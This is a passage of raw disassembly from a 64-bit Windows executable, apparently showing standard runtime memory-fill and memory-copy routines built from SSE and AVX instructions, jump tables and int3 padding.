   14000d1d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d1dd:	00 00 00 
   14000d1e0:	4c 3b 05 41 ae 00 00 	cmp    0xae41(%rip),%r8        # 0x140018028
   14000d1e7:	76 0d                	jbe    0x14000d1f6
   14000d1e9:	f6 05 58 b9 00 00 02 	testb  $0x2,0xb958(%rip)        # 0x140018b48
   14000d1f0:	0f 85 2a fd ff ff    	jne    0x14000cf20
   14000d1f6:	4c 8b c9             	mov    %rcx,%r9
   14000d1f9:	49 83 e1 0f          	and    $0xf,%r9
   14000d1fd:	49 83 e9 10          	sub    $0x10,%r9
   14000d201:	49 2b c9             	sub    %r9,%rcx
   14000d204:	49 2b d1             	sub    %r9,%rdx
   14000d207:	4d 03 c1             	add    %r9,%r8
   14000d20a:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000d211:	76 4b                	jbe    0x14000d25e
   14000d213:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000d21a:	84 00 00 00 00 00 
   14000d220:	66 0f 7f 01          	movdqa %xmm0,(%rcx)
   14000d224:	66 0f 7f 41 10       	movdqa %xmm0,0x10(%rcx)
   14000d229:	66 0f 7f 41 20       	movdqa %xmm0,0x20(%rcx)
   14000d22e:	66 0f 7f 41 30       	movdqa %xmm0,0x30(%rcx)
   14000d233:	66 0f 7f 41 40       	movdqa %xmm0,0x40(%rcx)
   14000d238:	66 0f 7f 41 50       	movdqa %xmm0,0x50(%rcx)
   14000d23d:	66 0f 7f 41 60       	movdqa %xmm0,0x60(%rcx)
   14000d242:	66 0f 7f 41 70       	movdqa %xmm0,0x70(%rcx)
   14000d247:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000d24e:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   14000d255:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000d25c:	73 c2                	jae    0x14000d220
   14000d25e:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   14000d262:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   14000d266:	4d 8b d9             	mov    %r9,%r11
   14000d269:	49 c1 eb 04          	shr    $0x4,%r11
   14000d26d:	47 8b 9c 9a f8 59 01 	mov    0x159f8(%r10,%r11,4),%r11d
   14000d274:	00 
   14000d275:	4d 03 da             	add    %r10,%r11
   14000d278:	41 ff e3             	jmp    *%r11
   14000d27b:	f3 42 0f 7f 44 09 80 	movdqu %xmm0,-0x80(%rcx,%r9,1)
   14000d282:	f3 42 0f 7f 44 09 90 	movdqu %xmm0,-0x70(%rcx,%r9,1)
   14000d289:	f3 42 0f 7f 44 09 a0 	movdqu %xmm0,-0x60(%rcx,%r9,1)
   14000d290:	f3 42 0f 7f 44 09 b0 	movdqu %xmm0,-0x50(%rcx,%r9,1)
   14000d297:	f3 42 0f 7f 44 09 c0 	movdqu %xmm0,-0x40(%rcx,%r9,1)
   14000d29e:	f3 42 0f 7f 44 09 d0 	movdqu %xmm0,-0x30(%rcx,%r9,1)
   14000d2a5:	f3 42 0f 7f 44 09 e0 	movdqu %xmm0,-0x20(%rcx,%r9,1)
   14000d2ac:	f3 42 0f 7f 44 01 f0 	movdqu %xmm0,-0x10(%rcx,%r8,1)
   14000d2b3:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   14000d2b7:	c3                   	ret
   14000d2b8:	cc                   	int3
   14000d2b9:	cc                   	int3
   14000d2ba:	cc                   	int3
   14000d2bb:	cc                   	int3
   14000d2bc:	cc                   	int3
   14000d2bd:	cc                   	int3
   14000d2be:	cc                   	int3
   14000d2bf:	cc                   	int3
   14000d2c0:	cc                   	int3
   14000d2c1:	cc                   	int3
   14000d2c2:	cc                   	int3
   14000d2c3:	cc                   	int3
   14000d2c4:	cc                   	int3
   14000d2c5:	cc                   	int3
   14000d2c6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d2cd:	00 00 00 
   14000d2d0:	cc                   	int3
   14000d2d1:	cc                   	int3
   14000d2d2:	cc                   	int3
   14000d2d3:	cc                   	int3
   14000d2d4:	cc                   	int3
   14000d2d5:	cc                   	int3
   14000d2d6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000d2dd:	00 00 00 
   14000d2e0:	57                   	push   %rdi
   14000d2e1:	56                   	push   %rsi
   14000d2e2:	48 8b f9             	mov    %rcx,%rdi
   14000d2e5:	48 8b f2             	mov    %rdx,%rsi
   14000d2e8:	49 8b c8             	mov    %r8,%rcx
   14000d2eb:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000d2ed:	5e                   	pop    %rsi
   14000d2ee:	5f                   	pop    %rdi
   14000d2ef:	c3                   	ret
   14000d2f0:	48 8b c1             	mov    %rcx,%rax
   14000d2f3:	4c 8d 15 06 2d ff ff 	lea    -0xd2fa(%rip),%r10        # 0x140000000
   14000d2fa:	49 83 f8 0f          	cmp    $0xf,%r8
   14000d2fe:	0f 87 0c 01 00 00    	ja     0x14000d410
   14000d304:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000d30b:	00 00 00 00 00 
   14000d310:	47 8b 8c 82 20 5a 01 	mov    0x15a20(%r10,%r8,4),%r9d
   14000d317:	00 
   14000d318:	4d 03 ca             	add    %r10,%r9
   14000d31b:	41 ff e1             	jmp    *%r9
   14000d31e:	c3                   	ret
   14000d31f:	90                   	nop
   14000d320:	4c 8b 02             	mov    (%rdx),%r8
   14000d323:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000d326:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000d32b:	44 0f b6 52 0e       	movzbl 0xe(%rdx),%r10d
   14000d330:	4c 89 00             	mov    %r8,(%rax)
   14000d333:	89 48 08             	mov    %ecx,0x8(%rax)
   14000d336:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000d33b:	44 88 50 0e          	mov    %r10b,0xe(%rax)
   14000d33f:	c3                   	ret
   14000d340:	4c 8b 02             	mov    (%rdx),%r8
   14000d343:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000d347:	44 0f b6 4a 0a       	movzbl 0xa(%rdx),%r9d
   14000d34c:	4c 89 00             	mov    %r8,(%rax)
   14000d34f:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000d353:	44 88 48 0a          	mov    %r9b,0xa(%rax)
   14000d357:	c3                   	ret
   14000d358:	0f b7 0a             	movzwl (%rdx),%ecx
   14000d35b:	66 89 08             	mov    %cx,(%rax)
   14000d35e:	c3                   	ret
   14000d35f:	90                   	nop
   14000d360:	8b 0a                	mov    (%rdx),%ecx
   14000d362:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000d367:	44 0f b6 4a 06       	movzbl 0x6(%rdx),%r9d
   14000d36c:	89 08                	mov    %ecx,(%rax)
   14000d36e:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000d373:	44 88 48 06          	mov    %r9b,0x6(%rax)
   14000d377:	c3                   	ret
   14000d378:	4c 8b 02             	mov    (%rdx),%r8
   14000d37b:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000d37e:	44 0f b7 4a 0c       	movzwl 0xc(%rdx),%r9d
   14000d383:	4c 89 00             	mov    %r8,(%rax)
   14000d386:	89 48 08             	mov    %ecx,0x8(%rax)
   14000d389:	66 44 89 48 0c       	mov    %r9w,0xc(%rax)
   14000d38e:	c3                   	ret
   14000d38f:	0f b7 0a             	movzwl (%rdx),%ecx
   14000d392:	44 0f b6 42 02       	movzbl 0x2(%rdx),%r8d
   14000d397:	66 89 08             	mov    %cx,(%rax)
   14000d39a:	44 88 40 02          	mov    %r8b,0x2(%rax)
   14000d39e:	c3                   	ret
   14000d39f:	90                   	nop
   14000d3a0:	4c 8b 02             	mov    (%rdx),%r8
   14000d3a3:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000d3a6:	44 0f b6 4a 0c       	movzbl 0xc(%rdx),%r9d
   14000d3ab:	4c 89 00             	mov    %r8,(%rax)
   14000d3ae:	89 48 08             	mov    %ecx,0x8(%rax)
   14000d3b1:	44 88 48 0c          	mov    %r9b,0xc(%rax)
   14000d3b5:	c3                   	ret
   14000d3b6:	4c 8b 02             	mov    (%rdx),%r8
   14000d3b9:	0f b7 4a 08          	movzwl 0x8(%rdx),%ecx
   14000d3bd:	4c 89 00             	mov    %r8,(%rax)
   14000d3c0:	66 89 48 08          	mov    %cx,0x8(%rax)
   14000d3c4:	c3                   	ret
   14000d3c5:	4c 8b 02             	mov    (%rdx),%r8
   14000d3c8:	0f b6 4a 08          	movzbl 0x8(%rdx),%ecx
   14000d3cc:	4c 89 00             	mov    %r8,(%rax)
   14000d3cf:	88 48 08             	mov    %cl,0x8(%rax)
   14000d3d2:	c3                   	ret
   14000d3d3:	4c 8b 02             	mov    (%rdx),%r8
   14000d3d6:	8b 4a 08             	mov    0x8(%rdx),%ecx
   14000d3d9:	4c 89 00             	mov    %r8,(%rax)
   14000d3dc:	89 48 08             	mov    %ecx,0x8(%rax)
   14000d3df:	c3                   	ret
   14000d3e0:	8b 0a                	mov    (%rdx),%ecx
   14000d3e2:	44 0f b7 42 04       	movzwl 0x4(%rdx),%r8d
   14000d3e7:	89 08                	mov    %ecx,(%rax)
   14000d3e9:	66 44 89 40 04       	mov    %r8w,0x4(%rax)
   14000d3ee:	c3                   	ret
   14000d3ef:	8b 0a                	mov    (%rdx),%ecx
   14000d3f1:	44 0f b6 42 04       	movzbl 0x4(%rdx),%r8d
   14000d3f6:	89 08                	mov    %ecx,(%rax)
   14000d3f8:	44 88 40 04          	mov    %r8b,0x4(%rax)
   14000d3fc:	c3                   	ret
   14000d3fd:	48 8b 0a             	mov    (%rdx),%rcx
   14000d400:	48 89 08             	mov    %rcx,(%rax)
   14000d403:	c3                   	ret
   14000d404:	0f b6 0a             	movzbl (%rdx),%ecx
   14000d407:	88 08                	mov    %cl,(%rax)
   14000d409:	c3                   	ret
   14000d40a:	8b 0a                	mov    (%rdx),%ecx
   14000d40c:	89 08                	mov    %ecx,(%rax)
   14000d40e:	c3                   	ret
   14000d40f:	90                   	nop
   14000d410:	49 83 f8 20          	cmp    $0x20,%r8
   14000d414:	77 17                	ja     0x14000d42d
   14000d416:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000d41a:	f3 42 0f 6f 54 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm2
   14000d421:	f3 0f 7f 09          	movdqu %xmm1,(%rcx)
   14000d425:	f3 42 0f 7f 54 01 f0 	movdqu %xmm2,-0x10(%rcx,%r8,1)
   14000d42c:	c3                   	ret
   14000d42d:	4e 8d 0c 02          	lea    (%rdx,%r8,1),%r9
   14000d431:	48 3b ca             	cmp    %rdx,%rcx
   14000d434:	4c 0f 46 c9          	cmovbe %rcx,%r9
   14000d438:	49 3b c9             	cmp    %r9,%rcx
   14000d43b:	0f 82 3f 04 00 00    	jb     0x14000d880
   14000d441:	83 3d d8 ab 00 00 03 	cmpl   $0x3,0xabd8(%rip)        # 0x140018020
   14000d448:	0f 82 e2 02 00 00    	jb     0x14000d730
   14000d44e:	49 81 f8 00 20 00 00 	cmp    $0x2000,%r8
   14000d455:	76 16                	jbe    0x14000d46d
   14000d457:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000d45e:	77 0d                	ja     0x14000d46d
   14000d460:	f6 05 e1 b6 00 00 02 	testb  $0x2,0xb6e1(%rip)        # 0x140018b48
   14000d467:	0f 85 73 fe ff ff    	jne    0x14000d2e0
   14000d46d:	c5 fe 6f 02          	vmovdqu (%rdx),%ymm0
   14000d471:	c4 a1 7e 6f 6c 02 e0 	vmovdqu -0x20(%rdx,%r8,1),%ymm5
   14000d478:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000d47f:	0f 86 c3 00 00 00    	jbe    0x14000d548
   14000d485:	4c 8b c9             	mov    %rcx,%r9
   14000d488:	49 83 e1 1f          	and    $0x1f,%r9
   14000d48c:	49 83 e9 20          	sub    $0x20,%r9
   14000d490:	49 2b c9             	sub    %r9,%rcx
   14000d493:	49 2b d1             	sub    %r9,%rdx
   14000d496:	4d 03 c1             	add    %r9,%r8
   14000d499:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000d4a0:	0f 86 a2 00 00 00    	jbe    0x14000d548
   14000d4a6:	49 81 f8 00 00 18 00 	cmp    $0x180000,%r8
   14000d4ad:	0f 87 3d 01 00 00    	ja     0x14000d5f0
   14000d4b3:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000d4ba:	84 00 00 00 00 00 
   14000d4c0:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   14000d4c4:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   14000d4c9:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000d4ce:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   14000d4d3:	c5 fd 7f 09          	vmovdqa %ymm1,(%rcx)
   14000d4d7:	c5 fd 7f 51 20       	vmovdqa %ymm2,0x20(%rcx)
   14000d4dc:	c5 fd 7f 59 40       	vmovdqa %ymm3,0x40(%rcx)
   14000d4e1:	c5 fd 7f 61 60       	vmovdqa %ymm4,0x60(%rcx)
   14000d4e6:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000d4ed:	00 
   14000d4ee:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   14000d4f5:	00 
   14000d4f6:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000d4fd:	00 
   14000d4fe:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   14000d505:	00 
   14000d506:	c5 fd 7f 89 80 00 00 	vmovdqa %ymm1,0x80(%rcx)
   14000d50d:	00 
   14000d50e:	c5 fd 7f 91 a0 00 00 	vmovdqa %ymm2,0xa0(%rcx)
   14000d515:	00 
   14000d516:	c5 fd 7f 99 c0 00 00 	vmovdqa %ymm3,0xc0(%rcx)
   14000d51d:	00 
   14000d51e:	c5 fd 7f a1 e0 00 00 	vmovdqa %ymm4,0xe0(%rcx)
   14000d525:	00 
   14000d526:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000d52d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   14000d534:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000d53b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000d542:	0f 83 78 ff ff ff    	jae    0x14000d4c0
   14000d548:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000d54c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000d550:	4d 8b d9             	mov    %r9,%r11
   14000d553:	49 c1 eb 05          	shr    $0x5,%r11
   14000d557:	47 8b 9c 9a 60 5a 01 	mov    0x15a60(%r10,%r11,4),%r11d
   14000d55e:	00 
   14000d55f:	4d 03 da             	add    %r10,%r11
   14000d562:	41 ff e3             	jmp    *%r11
   14000d565:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000d56c:	ff ff ff 
   14000d56f:	c4 a1 7e 7f 8c 09 00 	vmovdqu %ymm1,-0x100(%rcx,%r9,1)
   14000d576:	ff ff ff 
   14000d579:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   14000d580:	ff ff ff 
   14000d583:	c4 a1 7e 7f 8c 09 20 	vmovdqu %ymm1,-0xe0(%rcx,%r9,1)
   14000d58a:	ff ff ff 
   14000d58d:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   14000d594:	ff ff ff 
   14000d597:	c4 a1 7e 7f 8c 09 40 	vmovdqu %ymm1,-0xc0(%rcx,%r9,1)
   14000d59e:	ff ff ff 
   14000d5a1:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   14000d5a8:	ff ff ff 
   14000d5ab:	c4 a1 7e 7f 8c 09 60 	vmovdqu %ymm1,-0xa0(%rcx,%r9,1)
   14000d5b2:	ff ff ff 
   14000d5b5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000d5bc:	c4 a1 7e 7f 4c 09 80 	vmovdqu %ymm1,-0x80(%rcx,%r9,1)
   14000d5c3:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000d5ca:	c4 a1 7e 7f 4c 09 a0 	vmovdqu %ymm1,-0x60(%rcx,%r9,1)
   14000d5d1:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   14000d5d8:	c4 a1 7e 7f 4c 09 c0 	vmovdqu %ymm1,-0x40(%rcx,%r9,1)
   14000d5df:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   14000d5e6:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000d5ea:	c5 f8 77             	vzeroupper
   14000d5ed:	c3                   	ret
   14000d5ee:	66 90                	xchg   %ax,%ax
   14000d5f0:	c5 fe 6f 0a          	vmovdqu (%rdx),%ymm1
   14000d5f4:	c5 fe 6f 52 20       	vmovdqu 0x20(%rdx),%ymm2
   14000d5f9:	c5 fe 6f 5a 40       	vmovdqu 0x40(%rdx),%ymm3
   14000d5fe:	c5 fe 6f 62 60       	vmovdqu 0x60(%rdx),%ymm4
   14000d603:	c5 fd e7 09          	vmovntdq %ymm1,(%rcx)
   14000d607:	c5 fd e7 51 20       	vmovntdq %ymm2,0x20(%rcx)
   14000d60c:	c5 fd e7 59 40       	vmovntdq %ymm3,0x40(%rcx)
   14000d611:	c5 fd e7 61 60       	vmovntdq %ymm4,0x60(%rcx)
   14000d616:	c5 fe 6f 8a 80 00 00 	vmovdqu 0x80(%rdx),%ymm1
   14000d61d:	00 
   14000d61e:	c5 fe 6f 92 a0 00 00 	vmovdqu 0xa0(%rdx),%ymm2
   14000d625:	00 
   14000d626:	c5 fe 6f 9a c0 00 00 	vmovdqu 0xc0(%rdx),%ymm3
   14000d62d:	00 
   14000d62e:	c5 fe 6f a2 e0 00 00 	vmovdqu 0xe0(%rdx),%ymm4
   14000d635:	00 
   14000d636:	c5 fd e7 89 80 00 00 	vmovntdq %ymm1,0x80(%rcx)
   14000d63d:	00 
   14000d63e:	c5 fd e7 91 a0 00 00 	vmovntdq %ymm2,0xa0(%rcx)
   14000d645:	00 
   14000d646:	c5 fd e7 99 c0 00 00 	vmovntdq %ymm3,0xc0(%rcx)
   14000d64d:	00 
   14000d64e:	c5 fd e7 a1 e0 00 00 	vmovntdq %ymm4,0xe0(%rcx)
   14000d655:	00 
   14000d656:	48 81 c1 00 01 00 00 	add    $0x100,%rcx
   14000d65d:	48 81 c2 00 01 00 00 	add    $0x100,%rdx
   14000d664:	49 81 e8 00 01 00 00 	sub    $0x100,%r8
   14000d66b:	49 81 f8 00 01 00 00 	cmp    $0x100,%r8
   14000d672:	0f 83 78 ff ff ff    	jae    0x14000d5f0
   14000d678:	4d 8d 48 1f          	lea    0x1f(%r8),%r9
   14000d67c:	49 83 e1 e0          	and    $0xffffffffffffffe0,%r9
   14000d680:	4d 8b d9             	mov    %r9,%r11
   14000d683:	49 c1 eb 05          	shr    $0x5,%r11
   14000d687:	47 8b 9c 9a 84 5a 01 	mov    0x15a84(%r10,%r11,4),%r11d
   14000d68e:	00 
   14000d68f:	4d 03 da             	add    %r10,%r11
   14000d692:	41 ff e3             	jmp    *%r11
   14000d695:	c4 a1 7e 6f 8c 0a 00 	vmovdqu -0x100(%rdx,%r9,1),%ymm1
   14000d69c:	ff ff ff 
   14000d69f:	c4 a1 7d e7 8c 09 00 	vmovntdq %ymm1,-0x100(%rcx,%r9,1)
   14000d6a6:	ff ff ff 
   14000d6a9:	c4 a1 7e 6f 8c 0a 20 	vmovdqu -0xe0(%rdx,%r9,1),%ymm1
   14000d6b0:	ff ff ff 
   14000d6b3:	c4 a1 7d e7 8c 09 20 	vmovntdq %ymm1,-0xe0(%rcx,%r9,1)
   14000d6ba:	ff ff ff 
   14000d6bd:	c4 a1 7e 6f 8c 0a 40 	vmovdqu -0xc0(%rdx,%r9,1),%ymm1
   14000d6c4:	ff ff ff 
   14000d6c7:	c4 a1 7d e7 8c 09 40 	vmovntdq %ymm1,-0xc0(%rcx,%r9,1)
   14000d6ce:	ff ff ff 
   14000d6d1:	c4 a1 7e 6f 8c 0a 60 	vmovdqu -0xa0(%rdx,%r9,1),%ymm1
   14000d6d8:	ff ff ff 
   14000d6db:	c4 a1 7d e7 8c 09 60 	vmovntdq %ymm1,-0xa0(%rcx,%r9,1)
   14000d6e2:	ff ff ff 
   14000d6e5:	c4 a1 7e 6f 4c 0a 80 	vmovdqu -0x80(%rdx,%r9,1),%ymm1
   14000d6ec:	c4 a1 7d e7 4c 09 80 	vmovntdq %ymm1,-0x80(%rcx,%r9,1)
   14000d6f3:	c4 a1 7e 6f 4c 0a a0 	vmovdqu -0x60(%rdx,%r9,1),%ymm1
   14000d6fa:	c4 a1 7d e7 4c 09 a0 	vmovntdq %ymm1,-0x60(%rcx,%r9,1)
   14000d701:	c4 a1 7e 6f 4c 0a c0 	vmovdqu -0x40(%rdx,%r9,1),%ymm1
   14000d708:	c4 a1 7d e7 4c 09 c0 	vmovntdq %ymm1,-0x40(%rcx,%r9,1)
   14000d70f:	c4 a1 7e 7f 6c 01 e0 	vmovdqu %ymm5,-0x20(%rcx,%r8,1)
   14000d716:	c5 fe 7f 00          	vmovdqu %ymm0,(%rax)
   14000d71a:	0f ae f8             	sfence
   14000d71d:	c5 f8 77             	vzeroupper
   14000d720:	c3                   	ret
   14000d721:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000d728:	0f 1f 84 00 00 00 00 
   14000d72f:	00 
   14000d730:	49 81 f8 00 08 00 00 	cmp    $0x800,%r8
   14000d737:	76 0d                	jbe    0x14000d746
   14000d739:	f6 05 08 b4 00 00 02 	testb  $0x2,0xb408(%rip)        # 0x140018b48
   14000d740:	0f 85 9a fb ff ff    	jne    0x14000d2e0
   14000d746:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000d74a:	f3 42 0f 6f 6c 02 f0 	movdqu -0x10(%rdx,%r8,1),%xmm5
   14000d751:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000d758:	0f 86 8e 00 00 00    	jbe    0x14000d7ec
   14000d75e:	4c 8b c9             	mov    %rcx,%r9
   14000d761:	49 83 e1 0f          	and    $0xf,%r9
   14000d765:	49 83 e9 10          	sub    $0x10,%r9
   14000d769:	49 2b c9             	sub    %r9,%rcx
   14000d76c:	49 2b d1             	sub    %r9,%rdx
   14000d76f:	4d 03 c1             	add    %r9,%r8
   14000d772:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000d779:	76 71                	jbe    0x14000d7ec
   14000d77b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000d780:	f3 0f 6f 0a          	movdqu (%rdx),%xmm1
   14000d784:	f3 0f 6f 52 10       	movdqu 0x10(%rdx),%xmm2
   14000d789:	f3 0f 6f 5a 20       	movdqu 0x20(%rdx),%xmm3
   14000d78e:	f3 0f 6f 62 30       	movdqu 0x30(%rdx),%xmm4
   14000d793:	66 0f 7f 09          	movdqa %xmm1,(%rcx)
   14000d797:	66 0f 7f 51 10       	movdqa %xmm2,0x10(%rcx)
   14000d79c:	66 0f 7f 59 20       	movdqa %xmm3,0x20(%rcx)
   14000d7a1:	66 0f 7f 61 30       	movdqa %xmm4,0x30(%rcx)
   14000d7a6:	f3 0f 6f 4a 40       	movdqu 0x40(%rdx),%xmm1
   14000d7ab:	f3 0f 6f 52 50       	movdqu 0x50(%rdx),%xmm2
   14000d7b0:	f3 0f 6f 5a 60       	movdqu 0x60(%rdx),%xmm3
   14000d7b5:	f3 0f 6f 62 70       	movdqu 0x70(%rdx),%xmm4
   14000d7ba:	66 0f 7f 49 40       	movdqa %xmm1,0x40(%rcx)
   14000d7bf:	66 0f 7f 51 50       	movdqa %xmm2,0x50(%rcx)
   14000d7c4:	66 0f 7f 59 60       	movdqa %xmm3,0x60(%rcx)
   14000d7c9:	66 0f 7f 61 70       	movdqa %xmm4,0x70(%rcx)
   14000d7ce:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   14000d7d5:	48 81 c2 80 00 00 00 	add    $0x80,%rdx
   14000d7dc:	49 81 e8 80 00 00 00 	sub    $0x80,%r8
   14000d7e3:	49 81 f8 80 00 00 00 	cmp    $0x80,%r8
   14000d7ea:	73 94                	jae    0x14000d780
   14000d7ec:	4d 8d 48 0f          	lea    0xf(%r8),%r9
   14000d7f0:	49 83 e1 f0          	and    $0xfffffffffffffff0,%r9
   14000d7f4:	4d 8b d9             	mov    %r9,%r11
   14000d7f7:	49 c1 eb 04          	shr    $0x4,%r11
   14000d7fb:	47 8b 9c 9a a8 5a 01 	mov    0x15aa8(%r10,%r11,4),%r11d
   14000d802:	00 
   14000d803:	4d 03 da             	add    %r10,%r11
   14000d806:	41 ff e3             	jmp    *%r11
   14000d809:	f3 42 0f 6f 4c 0a 80 	movdqu -0x80(%rdx,%r9,1),%xmm1
   14000d810:	f3 42 0f 7f 4c 09 80 	movdqu %xmm1,-0x80(%rcx,%r9,1)
   14000d817:	f3 42 0f 6f 4c 0a 90 	movdqu -0x70(%rdx,%r9,1),%xmm1
   14000d81e:	f3 42 0f 7f 4c 09 90 	movdqu %xmm1,-0x70(%rcx,%r9,1)
   14000d825:	f3 42 0f 6f 4c 0a a0 	movdqu -0x60(%rdx,%r9,1),%xmm1
   14000d82c:	f3 42 0f 7f 4c 09 a0 	movdqu %xmm1,-0x60(%rcx,%r9,1)
   14000d833:	f3 42 0f 6f 4c 0a b0 	movdqu -0x50(%rdx,%r9,1),%xmm1
   14000d83a:	f3 42 0f 7f 4c 09 b0 	movdqu %xmm1,-0x50(%rcx,%r9,1)
   14000d841:	f3 42 0f 6f 4c 0a c0 	movdqu -0x40(%rdx,%r9,1),%xmm1
   14000d848:	f3 42 0f 7f 4c 09 c0 	movdqu %xmm1,-0x40(%rcx,%r9,1)
   14000d84f:	f3 42 0f 6f 4c 0a d0 	movdqu -0x30(%rdx,%r9,1),%xmm1
   14000d856:	f3 42 0f 7f 4c 09 d0 	movdqu %xmm1,-0x30(%rcx,%r9,1)
   14000d85d:	f3 42 0f 6f 4c 0a e0 	movdqu -0x20(%rdx,%r9,1),%xmm1
   14000d864:	f3 42 0f 7f 4c 09 e0 	movdqu %xmm1,-0x20(%rcx,%r9,1)
   14000d86b:	f3 42 0f 7f 6c 01 f0 	movdqu %xmm5,-0x10(%rcx,%r8,1)
   14000d872:	f3 0f 7f 00          	movdqu %xmm0,(%rax)
   14000d876:	c3                   	ret
   14000d877:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000d87e:	00 00 
   14000d880:	0f 10 12             	movups (%rdx),%xmm2
   14000d883:	48 2b d1             	sub    %rcx,%rdx
   14000d886:	49 03 c8             	add    %r8,%rcx
   14000d889:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000d88e:	48 83 e9 10          	sub    $0x10,%rcx
   14000d892:	49 83 e8 10          	sub    $0x10,%r8
   14000d896:	f6 c1 0f             	test   $0xf,%cl
   14000d899:	74 18                	je     0x14000d8b3
   14000d89b:	4c 8b c9             	mov    %rcx,%r9
   14000d89e:	48 83 e1 f0          	and    $0xfffffffffffffff0,%rcx
   14000d8a2:	0f 10 c8             	movups %xmm0,%xmm1
   14000d8a5:	0f 10 04 11          	movups (%rcx,%rdx,1),%xmm0
   14000d8a9:	41 0f 11 09          	movups %xmm1,(%r9)
   14000d8ad:	4c 8b c1             	mov    %rcx,%r8
   14000d8b0:	4c 2b c0             	sub    %rax,%r8
   14000d8b3:	4d 8b c8             	mov    %r8,%r9
   14000d8b6:	49 c1 e9 07          	shr    $0x7,%r9
   14000d8ba:	74 71                	je     0x14000d92d
   14000d8bc:	0f 29 01             	movaps %xmm0,(%rcx)
   14000d8bf:	eb 16                	jmp    0x14000d8d7
   14000d8c1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000d8c8:	0f 1f 84 00 00 00 00 
   14000d8cf:	00 
   14000d8d0:	0f 29 41 10          	movaps %xmm0,0x10(%rcx)
   14000d8d4:	0f 29 09             	movaps %xmm1,(%rcx)
   14000d8d7:	0f 10 44 11 f0       	movups -0x10(%rcx,%rdx,1),%xmm0
   14000d8dc:	0f 10 4c 11 e0       	movups -0x20(%rcx,%rdx,1),%xmm1
   14000d8e1:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   14000d8e8:	0f 29 41 70          	movaps %xmm0,0x70(%rcx)
   14000d8ec:	0f 29 49 60          	movaps %xmm1,0x60(%rcx)
   14000d8f0:	0f 10 44 11 50       	movups 0x50(%rcx,%rdx,1),%xmm0
   14000d8f5:	0f 10 4c 11 40       	movups 0x40(%rcx,%rdx,1),%xmm1
   14000d8fa:	49 ff c9             	dec    %r9
   14000d8fd:	0f 29 41 50          	movaps %xmm0,0x50(%rcx)
   14000d901:	0f 29 49 40          	movaps %xmm1,0x40(%rcx)
   14000d905:	0f 10 44 11 30       	movups 0x30(%rcx,%rdx,1),%xmm0
